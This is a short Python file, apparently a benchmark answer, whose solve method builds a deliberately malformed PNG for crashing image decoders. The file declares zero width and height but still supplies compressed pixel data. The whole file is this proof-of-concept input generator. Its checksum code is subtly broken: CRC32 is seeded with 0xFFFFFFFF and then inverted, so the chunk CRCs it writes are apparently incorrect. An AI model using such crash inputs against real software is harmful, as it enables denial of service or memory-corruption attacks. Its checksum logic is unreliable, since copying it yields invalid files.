import zlib
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        png_sig = b'\x89PNG\r\n\x1a\n'
        # IHDR with 0x0 dimensions, grayscale
        ihdr_data = b'\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00'
        ihdr_type = b'IHDR'
        crc_input = ihdr_type + ihdr_data
        crc = zlib.crc32(crc_input, 0xFFFFFFFF)
        ihdr_crc = struct.pack('>I', ~crc & 0xFFFFFFFF)
        ihdr_len = struct.pack('>I', 13)
        png = png_sig + ihdr_len + ihdr_type + ihdr_data + ihdr_crc
        # IDAT with non-empty compressed data
        fake_data = b'A'
        idat_data = zlib.compress(fake_data)
        idat_len = struct.pack('>I', len(idat_data))
        idat_type = b'IDAT'
        crc_input = idat_type + idat_data
        crc = zlib.crc32(crc_input, 0xFFFFFFFF)
        idat_crc = struct.pack('>I', ~crc & 0xFFFFFFFF)
        png += idat_len + idat_type + idat_data + idat_crc
        # IEND
        iend_len = struct.pack('>I', 0)
        iend_type = b'IEND'
        crc_input = iend_type
        crc = zlib.crc32(crc_input, 0xFFFFFFFF)
        iend_crc = struct.pack('>I', ~crc & 0xFFFFFFFF)
        png += iend_len + iend_type + iend_crc
        return png
